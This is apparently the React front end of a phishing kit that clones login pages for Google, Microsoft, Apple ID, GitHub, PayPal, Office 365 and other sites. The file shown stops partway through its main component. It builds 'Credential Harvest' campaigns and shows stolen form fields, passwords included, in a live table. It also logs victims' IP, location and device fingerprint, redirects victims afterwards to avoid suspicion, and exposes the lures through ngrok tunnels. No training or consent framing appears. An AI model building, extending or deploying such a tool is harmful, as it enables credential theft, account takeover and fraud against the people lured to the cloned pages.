import { useState, useEffect, useRef, useCallback } from 'react'
import { motion, AnimatePresence } from 'framer-motion'
import {
  Link2, ExternalLink, Trash2, Copy, CheckCheck, Globe, Monitor,
  Smartphone, Clock, Wifi, WifiOff, Cpu, MemoryStick, Eye, KeyRound,
  ChevronDown, ChevronRight, Fish, Plus, RefreshCw, AlertTriangle,
  Radio, Shield, Layers, Zap, X, Pencil,
} from 'lucide-react'
import clsx from 'clsx'

const API = 'http://localhost:3001'

// ── Types ─────────────────────────────────────────────────────────────────────

interface Geo {
  country: string; city: string; region: string
  isp: string; flag: string; local: boolean
}

interface Capture {
  id: string; campaignId: string; campaignName: string
  type: 'visit' | 'credentials'
  ip: string; geo: Geo; ua: string; os: string; browser: string; device: string
  screen: string; depth: number; tz: string; lang: string
  platform: string; vendor: string; cpu: number; mem: number
  online: boolean | null; fields: Record<string, string> | null
  ref: string; pageUrl: string; timestamp: string
}

interface Campaign {
  id: string; slug: string; name: string
  targetUrl: string; finalUrl: string
  mode: 'visit' | 'credentials'; redirectUrl: string
  created: number; captureCount: number
}

// ── Presets ───────────────────────────────────────────────────────────────────

interface Preset {
  name: string; url: string; icon: string
  mode: 'visit' | 'credentials'; category: string
}

const PRESETS: Preset[] = [
  // ── Auth portals
  { name: 'Google',      url: 'https://accounts.google.com/',                             icon: '🔵', mode: 'credentials', category: 'Auth' },
  { name: 'Microsoft',   url: 'https://login.microsoftonline.com/',                       icon: '🟦', mode: 'credentials', category: 'Auth' },
  { name: 'Apple ID',    url: 'https://appleid.apple.com/',                               icon: '⬛', mode: 'credentials', category: 'Auth' },
  { name: 'GitHub',      url: 'https://github.com/login',                                 icon: '🐙', mode: 'credentials', category: 'Dev' },
  { name: 'GitLab',      url: 'https://gitlab.com/users/sign_in',                         icon: '🦊', mode: 'credentials', category: 'Dev' },
  // ── Social
  { name: 'Facebook',    url: 'https://www.facebook.com/login',                           icon: '📘', mode: 'credentials', category: 'Social' },
  { name: 'Instagram',   url: 'https://www.instagram.com/accounts/login/',                icon: '📸', mode: 'credentials', category: 'Social' },
  { name: 'LinkedIn',    url: 'https://www.linkedin.com/login',                           icon: '💼', mode: 'credentials', category: 'Social' },
  { name: 'Twitter / X', url: 'https://x.com/i/flow/login',                              icon: '🐦', mode: 'credentials', category: 'Social' },
  // ── Cloud / Productivity
  { name: 'Office 365',  url: 'https://login.office.com/',                                icon: '🟠', mode: 'credentials', category: 'Cloud' },
  { name: 'Dropbox',     url: 'https://www.dropbox.com/login',                            icon: '📦', mode: 'credentials', category: 'Cloud' },
  { name: 'Outlook Web', url: 'https://outlook.office.com/',                              icon: '📧', mode: 'credentials', category: 'Cloud' },
  // ── Finance
  { name: 'PayPal',      url: 'https://www.paypal.com/signin',                            icon: '💳', mode: 'credentials', category: 'Finance' },
  // ── Recon only
  { name: 'Amazon',      url: 'https://www.amazon.com/ap/signin',                         icon: '📦', mode: 'credentials', category: 'Finance' },
  { name: 'Cloudflare',  url: 'https://dash.cloudflare.com/login',                       icon: '🔶', mode: 'credentials', category: 'Cloud' },
]

const PRESET_CATEGORIES = [...new Set(PRESETS.map(p => p.category))]

// ── Helpers ───────────────────────────────────────────────────────────────────

function timeAgo(ts: number | string): string {
  const diff = Date.now() - (typeof ts === 'string' ? new Date(ts).getTime() : ts)
  const s = Math.floor(diff / 1000)
  if (s < 60)  return `${s}s ago`
  const m = Math.floor(s / 60)
  if (m < 60)  return `${m}m ago`
  const h = Math.floor(m / 60)
  if (h < 24)  return `${h}h ago`
  return `${Math.floor(h / 24)}d ago`
}

function clampHost(url: string, max = 34): string {
  try { const h = new URL(url).hostname; return h.length > max ? h.slice(0, max) + '…' : h }
  catch { return url.slice(0, max) }
}

// ── Copy button ───────────────────────────────────────────────────────────────

function CopyBtn({ text, label = '' }: { text: string; label?: string }) {
  const [copied, setCopied] = useState(false)
  function copy() {
    navigator.clipboard.writeText(text).then(() => {
      setCopied(true); setTimeout(() => setCopied(false), 2000)
    })
  }
  return (
    <button onClick={copy} title="Copy to clipboard" className={clsx(
      'flex items-center gap-1.5 px-2 py-1 rounded text-[11px] font-medium transition-all',
      copied
        ? 'bg-emerald-500/15 text-emerald-400 border border-emerald-500/30'
        : 'bg-slate-700/50 hover:bg-slate-600/50 text-slate-400 hover:text-slate-200 border border-wire-2',
    )}>
      {copied ? <CheckCheck size={11} /> : <Copy size={11} />}
      {label && <span>{copied ? 'Copied!' : label}</span>}
    </button>
  )
}

// ── Badges ────────────────────────────────────────────────────────────────────

function ModeBadge({ mode }: { mode: 'visit' | 'credentials' }) {
  return mode === 'credentials'
    ? <span className="flex items-center gap-1 px-1.5 py-0.5 rounded text-[10px] font-semibold bg-rose-500/15 text-rose-400 border border-rose-500/25"><KeyRound size={9} /> Credential Harvest</span>
    : <span className="flex items-center gap-1 px-1.5 py-0.5 rounded text-[10px] font-semibold bg-blue-500/15 text-blue-400 border border-blue-500/25"><Eye size={9} /> Visit Tracker</span>
}

function TypeBadge({ type }: { type: 'visit' | 'credentials' }) {
  return type === 'credentials'
    ? <span className="flex items-center gap-1 px-2 py-0.5 rounded-full text-[10px] font-bold bg-rose-500/20 text-rose-300 border border-rose-500/30"><KeyRound size={9} /> CREDENTIALS</span>
    : <span className="flex items-center gap-1 px-2 py-0.5 rounded-full text-[10px] font-bold bg-blue-500/20 text-blue-300 border border-blue-500/30"><Eye size={9} /> VISIT</span>
}

// ── Credential table ──────────────────────────────────────────────────────────

function CredentialTable({ fields }: { fields: Record<string, string> }) {
  const [revealed, setRevealed] = useState<Set<string>>(new Set())
  const entries = Object.entries(fields).filter(([, v]) => v !== '')
  if (!entries.length) return <p className="text-slate-600 text-[11px] italic">No form fields captured</p>
  const isSensitive = (k: string) => /pass|pwd|secret|token|key|pin|cvv/i.test(k)

  return (
    <div className="rounded border border-rose-500/20 overflow-hidden">
      <table className="w-full text-[11px]">
        <thead>
          <tr className="bg-rose-500/10 border-b border-rose-500/20">
            <th className="text-left px-3 py-1.5 text-rose-400/70 font-semibold tracking-wider uppercase text-[10px] w-1/3">Field</th>
            <th className="text-left px-3 py-1.5 text-rose-400/70 font-semibold tracking-wider uppercase text-[10px]">Value</th>
          </tr>
        </thead>
        <tbody>
          {entries.map(([k, v]) => {
            const sensitive = isSensitive(k)
            const show      = revealed.has(k)
            return (
              <tr key={k} className="border-b border-rose-500/10 last:border-0 hover:bg-rose-500/5">
                <td className="px-3 py-1.5 text-slate-400 font-mono">{k}</td>
                <td className="px-3 py-1.5 font-mono text-emerald-300">
                  <div className="flex items-center gap-2">
                    <span className={sensitive && !show ? 'blur-sm select-none' : ''}>{v}</span>
                    {sensitive && (
                      <button onClick={() => setRevealed(s => { const n = new Set(s); n.has(k) ? n.delete(k) : n.add(k); return n })}
                        className="text-slate-500 hover:text-slate-300 text-[10px]">
                        {show ? 'hide' : 'reveal'}
                      </button>
                    )}
                  </div>
                </td>
              </tr>
            )
          })}
        </tbody>
      </table>
    </div>
  )
}

// ── Capture card ──────────────────────────────────────────────────────────────

function CaptureCard({ capture, highlight }: { capture: Capture; highlight?: boolean }) {
  const [expanded, setExpanded] = useState(false)
  const hasCreds   = capture.type === 'credentials' && capture.fields && Object.keys(capture.fields).length > 0
  const hasDetails = hasCreds || capture.screen || capture.tz || capture.geo.isp || capture.cpu > 0

  return (
    <motion.div
      layout
      initial={{ opacity: 0, y: -8 }}
      animate={{ opacity: 1, y: 0 }}
      transition={{ duration: 0.25 }}
      className={clsx(
        'rounded-lg border overflow-hidden transition-colors duration-1000',
        highlight && hasCreds ? 'border-rose-500/60 bg-rose-500/8' :
        highlight             ? 'border-blue-500/40 bg-blue-500/5' :
        hasCreds              ? 'border-rose-500/30 bg-surface-1' :
                                'border-wire-2 bg-surface-1',
      )}
    >
      <div className="flex items-start gap-3 p-3">
        {/* Geo flag */}
        <div className="flex-shrink-0 w-9 h-9 rounded-md bg-surface-0 border border-wire-2 flex items-center justify-center text-xl leading-none">
          {capture.geo.flag}
        </div>

        {/* Main info */}
        <div className="flex-1 min-w-0 space-y-1">
          <div className="flex items-center gap-2 flex-wrap">
            <TypeBadge type={capture.type} />
            <span className="text-[11px] text-slate-500 font-mono">{capture.ip || 'unknown'}</span>
            {capture.geo.city && (
              <span className="text-[11px] text-slate-600">
                {capture.geo.city}{capture.geo.country ? `, ${capture.geo.country}` : ''}
              </span>
            )}
          </div>
          <div className="flex items-center gap-3 flex-wrap">
            <span className="text-[11px] text-slate-300 font-medium">{capture.browser}</span>
            <span className="text-slate-700 text-[10px]">•</span>
            <span className="text-[11px] text-slate-400">{capture.os}</span>
            <span className="text-slate-700 text-[10px]">•</span>
            <span className="flex items-center gap-1 text-[11px] text-slate-500">
              {capture.device === 'Mobile' ? <Smartphone size={10} /> : <Monitor size={10} />}
              {capture.device}
            </span>
          </div>
          {capture.geo.isp && <p className="text-[10px] text-slate-600 truncate">{capture.geo.isp}</p>}
        </div>

        {/* Right: time + expand */}
        <div className="flex-shrink-0 flex flex-col items-end gap-1.5">
          <span className="flex items-center gap-1 text-[10px] text-slate-600">
            <Clock size={9} /> {timeAgo(capture.timestamp)}
          </span>
          <span className="text-[10px] text-slate-500 font-medium">{capture.campaignName}</span>
          {hasDetails && (
            <button onClick={() => setExpanded(e => !e)}
              className="flex items-center gap-1 text-[10px] text-slate-500 hover:text-slate-300 transition-colors mt-0.5">
              {expanded ? <ChevronDown size={10} /> : <ChevronRight size={10} />}
              details
            </button>
          )}
        </div>
      </div>

      {/* Expanded detail */}
      <AnimatePresence>
        {expanded && (
          <motion.div
            initial={{ height: 0, opacity: 0 }} animate={{ height: 'auto', opacity: 1 }}
            exit={{ height: 0, opacity: 0 }} transition={{ duration: 0.2 }}
            className="overflow-hidden"
          >
            <div className="border-t border-wire-2 px-3 py-3 space-y-3">
              {/* System fingerprint */}
              <div className="grid grid-cols-2 gap-x-4 gap-y-1.5 text-[11px]">
                {capture.screen && (<><span className="text-slate-600">Screen</span><span className="text-slate-300 font-mono">{capture.screen}{capture.depth ? ` @ ${capture.depth}bit` : ''}</span></>)}
                {capture.tz     && (<><span className="text-slate-600">Timezone</span><span className="text-slate-300">{capture.tz}</span></>)}
                {capture.lang   && (<><span className="text-slate-600">Language</span><span className="text-slate-300">{capture.lang}</span></>)}
                {capture.platform && (<><span className="text-slate-600">Platform</span><span className="text-slate-300 font-mono">{capture.platform}</span></>)}
                {capture.vendor && (<><span className="text-slate-600">Vendor</span><span className="text-slate-300">{capture.vendor}</span></>)}
                {capture.cpu > 0 && (<><span className="text-slate-600 flex items-center gap-1"><Cpu size={9} /> CPU cores</span><span className="text-slate-300">{capture.cpu}</span></>)}
                {capture.mem > 0 && (<><span className="text-slate-600 flex items-center gap-1"><MemoryStick size={9} /> Device RAM</span><span className="text-slate-300">{capture.mem} GB</span></>)}
                {capture.online !== null && (<><span className="text-slate-600">Connection</span><span className={clsx('flex items-center gap-1', capture.online ? 'text-emerald-400' : 'text-slate-500')}>{capture.online ? <Wifi size={10} /> : <WifiOff size={10} />}{capture.online ? 'Online' : 'Offline'}</span></>)}
                {capture.ref && (<><span className="text-slate-600">Referrer</span><span className="text-slate-300 font-mono truncate" title={capture.ref}>{capture.ref.slice(0, 50)}</span></>)}
                {capture.pageUrl && (<><span className="text-slate-600">Page URL</span><span className="text-slate-300 font-mono truncate" title={capture.pageUrl}>{capture.pageUrl.slice(0, 50)}</span></>)}
                {capture.geo.isp && (<><span className="text-slate-600">ISP / Org</span><span className="text-slate-300">{capture.geo.isp}</span></>)}
              </div>

              {/* Credentials */}
              {hasCreds && (
                <div className="space-y-1.5">
                  <p className="text-[10px] font-semibold tracking-widest uppercase text-rose-400/80">Captured Fields</p>
                  <CredentialTable fields={capture.fields!} />
                </div>
              )}

              {/* Raw UA */}
              <div className="space-y-1">
                <p className="text-[10px] font-semibold tracking-widest uppercase text-slate-600">User-Agent</p>
                <p className="text-[10px] font-mono text-slate-600 break-all leading-relaxed">{capture.ua}</p>
              </div>
            </div>
          </motion.div>
        )}
      </AnimatePresence>
    </motion.div>
  )
}

// ── Campaign card ─────────────────────────────────────────────────────────────

function CampaignCard({ campaign, selected, baseUrl, onSelect, onDelete }: {
  campaign: Campaign; selected: boolean; baseUrl: string
  onSelect: () => void; onDelete: () => void
}) {
  const origin = baseUrl.replace(/\/+$/, '') || API
  const link   = `${origin}/${campaign.slug}`

  return (
    <motion.div
      layout
      initial={{ opacity: 0, x: -8 }} animate={{ opacity: 1, x: 0 }}
      exit={{ opacity: 0, x: -8 }} transition={{ duration: 0.2 }}
      onClick={onSelect}
      className={clsx(
        'rounded-lg border p-3 cursor-pointer transition-all space-y-2',
        selected ? 'border-blue-500/40 bg-blue-500/8' : 'border-wire-2 bg-surface-0 hover:border-wire-3 hover:bg-surface-1',
      )}
    >
      <div className="flex items-start justify-between gap-2">
        <div className="min-w-0">
          <p className="text-[13px] font-semibold text-slate-200 truncate">{campaign.name}</p>
          <p className="text-[11px] text-slate-500 truncate mt-0.5">{clampHost(campaign.targetUrl)}</p>
        </div>
        <button onClick={e => { e.stopPropagation(); onDelete() }}
          className="flex-shrink-0 p-1 rounded text-slate-600 hover:text-rose-400 hover:bg-rose-500/10 transition-colors" title="Delete">
          <Trash2 size={12} />
        </button>
      </div>

      <div className="flex items-center gap-2 flex-wrap">
        <ModeBadge mode={campaign.mode} />
        <span className={clsx(
          'flex items-center gap-1 px-1.5 py-0.5 rounded text-[10px] font-semibold border',
          campaign.captureCount > 0
            ? 'bg-emerald-500/15 text-emerald-400 border-emerald-500/25'
            : 'bg-slate-700/40 text-slate-500 border-wire-2',
        )}>
          <Radio size={9} /> {campaign.captureCount} capture{campaign.captureCount !== 1 ? 's' : ''}
        </span>
        <span className="text-[10px] text-slate-600 ml-auto">{timeAgo(campaign.created)}</span>
      </div>

      {/* Obfuscated link — looks like the real site's URL */}
      <div className="flex items-center gap-1.5 bg-surface-0 border border-wire-1 rounded px-2 py-1.5"
        onClick={e => e.stopPropagation()}>
        <Link2 size={10} className="text-slate-600 flex-shrink-0" />
        <span className="text-[10px] font-mono text-slate-400 truncate flex-1" title={link}>{link}</span>
        <div className="flex items-center gap-1 flex-shrink-0">
          <CopyBtn text={link} />
          <a href={link} target="_blank" rel="noopener noreferrer"
            className="p-1 rounded text-slate-600 hover:text-blue-400 transition-colors" title="Open page">
            <ExternalLink size={11} />
          </a>
        </div>
      </div>
    </motion.div>
  )
}

// ── Preset grid ───────────────────────────────────────────────────────────────

function PresetGrid({ onSelect }: { onSelect: (p: Preset) => void }) {
  const [open, setOpen]     = useState(false)
  const [active, setActive] = useState('Auth')

  return (
    <div className="space-y-1.5">
      <button onClick={() => setOpen(o => !o)}
        className="flex items-center gap-1.5 text-[11px] text-slate-500 hover:text-slate-300 transition-colors w-full">
        {open ? <ChevronDown size={11} /> : <ChevronRight size={11} />}
        <span className="font-semibold uppercase tracking-wider">Presets</span>
        <span className="text-slate-700 ml-auto">{PRESETS.length} sites</span>
      </button>

      <AnimatePresence>
        {open && (
          <motion.div
            initial={{ height: 0, opacity: 0 }} animate={{ height: 'auto', opacity: 1 }}
            exit={{ height: 0, opacity: 0 }} transition={{ duration: 0.18 }}
            className="overflow-hidden"
          >
            <div className="space-y-2">
              {/* Category tabs */}
              <div className="flex gap-1 flex-wrap">
                {PRESET_CATEGORIES.map(cat => (
                  <button key={cat} onClick={() => setActive(cat)}
                    className={clsx(
                      'px-2 py-0.5 rounded text-[10px] font-semibold transition-colors',
                      active === cat ? 'bg-blue-500/20 text-blue-300' : 'text-slate-600 hover:text-slate-400',
                    )}>
                    {cat}
                  </button>
                ))}
              </div>

              {/* Preset buttons */}
              <div className="grid grid-cols-2 gap-1.5">
                {PRESETS.filter(p => p.category === active).map(preset => (
                  <button key={preset.url} onClick={() => onSelect(preset)}
                    className="flex items-center gap-1.5 px-2 py-1.5 rounded-md border border-wire-2 bg-surface-0 hover:border-wire-3 hover:bg-surface-1 transition-all text-left group">
                    <span className="text-base leading-none">{preset.icon}</span>
                    <div className="min-w-0">
                      <p className="text-[11px] font-medium text-slate-300 group-hover:text-slate-100 truncate">{preset.name}</p>
                      <p className="text-[9px] text-slate-600 truncate">{new URL(preset.url).hostname}</p>
                    </div>
                  </button>
                ))}
              </div>
            </div>
          </motion.div>
        )}
      </AnimatePresence>
    </div>
  )
}

// ── New campaign form ─────────────────────────────────────────────────────────

function NewCampaignForm({ onCreated }: { onCreated: (c: Campaign) => void }) {
  const [name,        setName]        = useState('')
  const [targetUrl,   setTargetUrl]   = useState('')
  const [mode,        setMode]        = useState<'visit' | 'credentials'>('credentials')
  const [redirectUrl, setRedirectUrl] = useState('')
  const [loading,     setLoading]     = useState(false)
  const [error,       setError]       = useState('')

  function applyPreset(p: Preset) {
    setTargetUrl(p.url)
    setName(p.name)
    setMode(p.mode)
  }

  async function submit(e: React.FormEvent) {
    e.preventDefault()
    if (!name.trim() || !targetUrl.trim()) return
    setLoading(true); setError('')
    try {
      const r = await fetch(`${API}/api/phishing/campaigns`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ name: name.trim(), targetUrl: targetUrl.trim(), mode, redirectUrl: redirectUrl.trim() }),
      })
      const data = await r.json()
      if (!r.ok) throw new Error(data.error || 'Clone failed')
      onCreated(data)
      setName(''); setTargetUrl(''); setRedirectUrl('')
    } catch (err) {
      setError(err instanceof Error ? err.message : 'Unknown error')
    } finally { setLoading(false) }
  }

  return (
    <form onSubmit={submit} className="space-y-3">
      {/* Presets */}
      <PresetGrid onSelect={applyPreset} />

      <div className="h-px bg-wire-1" />

      {/* Campaign name */}
      <div className="space-y-1">
        <label className="text-[11px] font-semibold text-slate-400 uppercase tracking-wider">Campaign Name</label>
        <input value={name} onChange={e => setName(e.target.value)}
          placeholder="e.g. Corp Portal Clone"
          className="w-full bg-surface-0 border border-wire-2 rounded px-3 py-2 text-[13px] text-slate-200 placeholder:text-slate-600 focus:outline-none focus:border-blue-500/50 focus:ring-1 focus:ring-blue-500/20 transition-all"
          disabled={loading} />
      </div>

      {/* Target URL */}
      <div className="space-y-1">
        <label className="text-[11px] font-semibold text-slate-400 uppercase tracking-wider">Target URL</label>
        <input value={targetUrl} onChange={e => setTargetUrl(e.target.value)}
          placeholder="https://accounts.google.com/"
          className="w-full bg-surface-0 border border-wire-2 rounded px-3 py-2 text-[13px] text-slate-200 placeholder:text-slate-600 focus:outline-none focus:border-blue-500/50 focus:ring-1 focus:ring-blue-500/20 transition-all font-mono"
          disabled={loading} />
        {targetUrl && (() => {
          try {
            const slug = new URL(/^https?:\/\//i.test(targetUrl) ? targetUrl : 'https://' + targetUrl)
            const preview = `${API}/${slug.hostname}${slug.pathname === '/' ? '' : slug.pathname}`
            return <p className="text-[10px] font-mono text-slate-600 truncate" title={preview}>→ {preview}</p>
          } catch { return null }
        })()}
      </div>

      {/* Mode selector */}
      <div className="space-y-1">
        <label className="text-[11px] font-semibold text-slate-400 uppercase tracking-wider">Capture Mode</label>
        <div className="grid grid-cols-2 gap-2">
          {(['visit', 'credentials'] as const).map(m => (
            <button key={m} type="button" onClick={() => setMode(m)}
              className={clsx(
                'flex flex-col items-start gap-1 p-2.5 rounded-md border text-left transition-all',
                mode === m
                  ? m === 'credentials' ? 'border-rose-500/50 bg-rose-500/10' : 'border-blue-500/50 bg-blue-500/10'
                  : 'border-wire-2 bg-surface-0 hover:border-wire-3',
              )}>
              <span className="flex items-center gap-1.5">
                {m === 'credentials' ? <KeyRound size={11} className="text-rose-400" /> : <Eye size={11} className="text-blue-400" />}
                <span className={clsx('text-[11px] font-semibold', mode === m ? (m === 'credentials' ? 'text-rose-300' : 'text-blue-300') : 'text-slate-400')}>
                  {m === 'credentials' ? 'Credential Harvest' : 'Visit Tracker'}
                </span>
              </span>
              <span className="text-[10px] text-slate-600 leading-snug">
                {m === 'credentials' ? 'Intercept form submissions' : 'Log IP, device & fingerprint'}
              </span>
            </button>
          ))}
        </div>
      </div>

      {/* Redirect URL */}
      <AnimatePresence>
        {mode === 'credentials' && (
          <motion.div initial={{ height: 0, opacity: 0 }} animate={{ height: 'auto', opacity: 1 }}
            exit={{ height: 0, opacity: 0 }} transition={{ duration: 0.18 }} className="overflow-hidden">
            <div className="space-y-1">
              <label className="text-[11px] font-semibold text-slate-400 uppercase tracking-wider">
                Post-Submit Redirect <span className="text-slate-600 normal-case font-normal">(optional)</span>
              </label>
              <input value={redirectUrl} onChange={e => setRedirectUrl(e.target.value)}
                placeholder="https://accounts.google.com/login-error"
                className="w-full bg-surface-0 border border-wire-2 rounded px-3 py-2 text-[13px] text-slate-200 placeholder:text-slate-600 focus:outline-none focus:border-rose-500/40 focus:ring-1 focus:ring-rose-500/15 transition-all font-mono"
                disabled={loading} />
              <p className="text-[10px] text-slate-600">After credential capture, victim redirects here to avoid suspicion.</p>
            </div>
          </motion.div>
        )}
      </AnimatePresence>

      {/* Error */}
      <AnimatePresence>
        {error && (
          <motion.div initial={{ opacity: 0, y: -4 }} animate={{ opacity: 1, y: 0 }} exit={{ opacity: 0 }}
            className="flex items-start gap-2 p-2.5 rounded-md bg-rose-500/10 border border-rose-500/25">
            <AlertTriangle size={13} className="text-rose-400 flex-shrink-0 mt-0.5" />
            <p className="text-[12px] text-rose-300 leading-snug">{error}</p>
          </motion.div>
        )}
      </AnimatePresence>

      {/* Submit */}
      <button type="submit"
        disabled={loading || !name.trim() || !targetUrl.trim()}
        className={clsx(
          'w-full flex items-center justify-center gap-2 py-2.5 rounded-md text-[13px] font-semibold transition-all',
          loading || !name.trim() || !targetUrl.trim()
            ? 'bg-slate-700/50 text-slate-500 cursor-not-allowed border border-wire-2'
            : 'bg-blue-500 hover:bg-blue-400 text-white shadow-lg shadow-blue-500/20',
        )}>
        {loading ? <><RefreshCw size={13} className="animate-spin" /> Cloning site…</> : <><Plus size={13} /> Build Payload</>}
      </button>
    </form>
  )
}

// ── Tunnel URL banner ─────────────────────────────────────────────────────────

const LS_KEY = 'cw-phishing-base-url'

type TunnelStatus = 'starting' | 'connected' | 'error' | 'closed'

function TunnelBanner({
  manualUrl, autoUrl, autoStatus, onManualChange,
}: {
  manualUrl: string
  autoUrl: string
  autoStatus: TunnelStatus
  onManualChange: (v: string) => void
}) {
  const [showOverride, setShowOverride] = useState(false)
  const [draft, setDraft] = useState(manualUrl)
  const effectiveUrl = manualUrl || autoUrl
  const isAuto = !manualUrl && !!autoUrl

  function saveManual() {
    const clean = draft.trim().replace(/\/+$/, '')
    onManualChange(clean)
    localStorage.setItem(LS_KEY, clean)
    setShowOverride(false)
  }

  function clearManual() {
    onManualChange('')
    setDraft('')
    localStorage.removeItem(LS_KEY)
    setShowOverride(false)
  }

  // ── Connected (auto or manual) ──────────────────────────────────────────────
  if (effectiveUrl) {
    return (
      <div className="flex-shrink-0 border-b border-emerald-500/20 bg-emerald-500/6">
        <div className="flex items-center gap-3 px-5 py-2">
          <span className="w-1.5 h-1.5 rounded-full bg-emerald-400 animate-pulse flex-shrink-0" />
          <span className="text-[11px] text-emerald-400 font-semibold">Tunnel active</span>
          <span className={clsx(
            'text-[9px] font-bold px-1.5 py-0.5 rounded uppercase tracking-wider',
            isAuto ? 'bg-blue-500/20 text-blue-400 border border-blue-500/25' : 'bg-slate-700 text-slate-400',
          )}>
            {isAuto ? 'auto' : 'manual'}
          </span>
          <span className="text-[11px] font-mono text-slate-300 truncate flex-1">{effectiveUrl}</span>
          <button onClick={() => { setDraft(manualUrl); setShowOverride(o => !o) }}
            className="flex items-center gap-1 text-[10px] text-slate-500 hover:text-slate-300 transition-colors flex-shrink-0">
            <Pencil size={9} /> override
          </button>
          {manualUrl && (
            <button onClick={clearManual}
              className="text-slate-600 hover:text-slate-400 transition-colors flex-shrink-0 ml-1">
              <X size={11} />
            </button>
          )}
        </div>

        <AnimatePresence>
          {showOverride && (
            <motion.div initial={{ height: 0, opacity: 0 }} animate={{ height: 'auto', opacity: 1 }}
              exit={{ height: 0, opacity: 0 }} transition={{ duration: 0.15 }}
              className="overflow-hidden border-t border-emerald-500/15 px-5 py-2">
              <div className="flex items-center gap-2">
                <span className="text-[11px] text-slate-500 flex-shrink-0">Manual URL</span>
                <input value={draft} onChange={e => setDraft(e.target.value)}
                  onKeyDown={e => e.key === 'Enter' && saveManual()}
                  placeholder="https://your-tunnel.ngrok-free.app"
                  className="flex-1 bg-surface-0 border border-wire-2 rounded px-3 py-1 text-[11px] font-mono text-slate-200 placeholder:text-slate-600 focus:outline-none focus:border-blue-500/40 transition-all" />
                <button onClick={saveManual}
                  className="px-2.5 py-1 rounded text-[11px] font-semibold bg-blue-500 hover:bg-blue-400 text-white transition-colors flex-shrink-0">
                  Save
                </button>
                <button onClick={() => setShowOverride(false)}
                  className="text-[11px] text-slate-500 hover:text-slate-300 transition-colors flex-shrink-0">
                  Cancel
                </button>
              </div>
            </motion.div>
          )}
        </AnimatePresence>
      </div>
    )
  }

  // ── Starting / waiting for auto-tunnel ──────────────────────────────────────
  if (autoStatus === 'starting') {
    return (
      <div className="flex-shrink-0 flex items-center gap-3 px-5 py-2.5 border-b border-blue-500/15 bg-blue-500/5">
        <RefreshCw size={11} className="text-blue-400 animate-spin flex-shrink-0" />
        <span className="text-[11px] text-blue-300">Establishing public tunnel…</span>
        <span className="text-[10px] text-slate-600">links will update automatically</span>
      </div>
    )
  }

  // ── Error / no tunnel — show manual setup ───────────────────────────────────
  return (
    <div className="flex-shrink-0 border-b border-amber-500/25 bg-amber-500/6 px-5 py-3">
      <div className="flex items-start gap-3">
        <AlertTriangle size={13} className="text-amber-400 flex-shrink-0 mt-0.5" />
        <div className="flex-1 min-w-0 space-y-2">
          <p className="text-[12px] text-amber-300 font-medium">
            {autoStatus === 'error'
              ? 'Auto-tunnel failed — links only reachable from your machine.'
              : <>Links show <code className="font-mono bg-amber-500/15 px-1 rounded">localhost:3001</code> — only reachable from your machine.</>}
          </p>
          <p className="text-[11px] text-slate-500">
            Paste a tunnel URL from{' '}
            <code className="font-mono bg-surface-0 border border-wire-2 text-slate-300 px-1.5 py-0.5 rounded text-[10px]">ngrok http 3001</code>
            {' '}or any reverse proxy:
          </p>
          <div className="flex items-center gap-2">
            <input value={draft} onChange={e => setDraft(e.target.value)}
              onKeyDown={e => e.key === 'Enter' && draft.trim() && saveManual()}
              placeholder="https://abc123.ngrok-free.app"
              className="flex-1 bg-surface-0 border border-wire-2 rounded px-3 py-1.5 text-[12px] font-mono text-slate-200 placeholder:text-slate-600 focus:outline-none focus:border-amber-500/50 focus:ring-1 focus:ring-amber-500/20 transition-all" />
            <button onClick={saveManual} disabled={!draft.trim()}
              className="px-3 py-1.5 rounded text-[12px] font-semibold bg-amber-500 hover:bg-amber-400 disabled:opacity-40 disabled:cursor-not-allowed text-black transition-colors flex-shrink-0">
              Save
            </button>
          </div>
        </div>
      </div>
    </div>
  )
}

// ── Main component ────────────────────────────────────────────────────────────

export function PhishingPayloadBuilder() {
  const [campaigns,       setCampaigns]       = useState<Campaign[]>([])
  const [captures,        setCaptures]        = useState<Capture[]>([])
  const [selectedCampaign, setSelectedCampaign] = useState<string | null>(null)
  const [newCaptures,     setNewCaptures]     = useState<Set<string>>(new Set())
  const [sseConnected,    setSseConnected]    = useState(false)
  const [filterCampaign,  setFilterCampaign]  = useState<string>('all')
  const [publicBaseUrl,   setPublicBaseUrl]   = useState<string>(() => localStorage.getItem(LS_KEY) || '')
  const [autoUrl,         setAutoUrl]         = useState<string>('')
  const [autoStatus,      setAutoStatus]      = useState<TunnelStatus>('starting')
  const esRef = useRef<EventSource | null>(null)

  useEffect(() => {
    fetch(`${API}/api/phishing/campaigns`).then(r => r.json()).then(setCampaigns).catch(() => {})
    fetch(`${API}/api/phishing/tunnel`)
      .then(r => r.json())
      .then(({ url, status }: { url: string; status: string }) => {
        if (status === 'connected' && url) { setAutoUrl(url); setAutoStatus('connected') }
        else if (status === 'error')        setAutoStatus('error')
        else                               setAutoStatus('starting')
      })
      .catch(() => setAutoStatus('error'))
  }, [])

  useEffect(() => {
    const es = new EventSource(`${API}/api/phishing/stream`)
    esRef.current = es
    es.addEventListener('open',  () => setSseConnected(true))
    es.addEventListener('error', () => setSseConnected(false))

    es.addEventListener('tunnel', (e: MessageEvent) => {
      const { url, status }: { url: string; status: string } = JSON.parse(e.data)
      if (status === 'connected' && url) { setAutoUrl(url); setAutoStatus('connected') }
      else if (status === 'error')        { setAutoUrl(''); setAutoStatus('error') }
      else                               { setAutoUrl(''); setAutoStatus('closed') }
    })

    es.addEventListener('capture', (e: MessageEvent) => {
      const c: Capture = JSON.parse(e.data)
      setCaptures(prev => [c, ...prev])
      setNewCaptures(s => new Set([...s, c.id]))
      setTimeout(() => setNewCaptures(s => { const n = new Set(s); n.delete(c.id); return n }), 5000)
      setCampaigns(prev => prev.map(camp =>
        camp.id === c.campaignId ? { ...camp, captureCount: camp.captureCount + 1 } : camp
      ))
    })

    es.addEventListener('campaign_deleted', (e: MessageEvent) => {
      const { id } = JSON.parse(e.data)
      setCampaigns(prev => prev.filter(c => c.id !== id))
      setCaptures(prev => prev.filter(c => c.campaignId !== id))
    })

    return () => { es.close(); setSseConnected(false) }
  }, [])

  const loadCaptures = useCallback((campaignId: string) => {
    fetch(`${API}/api/phishing/captures/${campaignId}`)
      .then(r => r.json())
      .then((list: Capture[]) => {
        setCaptures(prev => {
          const existing = new Set(prev.map(c => c.id))
          return [...list.filter(c => !existing.has(c.id)), ...prev]
        })
      }).catch(() => {})
  }, [])

  function handleSelectCampaign(id: string) {
    const next = selectedCampaign === id ? null : id
    setSelectedCampaign(next)
    if (next) { setFilterCampaign(next); loadCaptures(next) }
    else        setFilterCampaign('all')
  }

  function handleCampaignCreated(campaign: Campaign) {
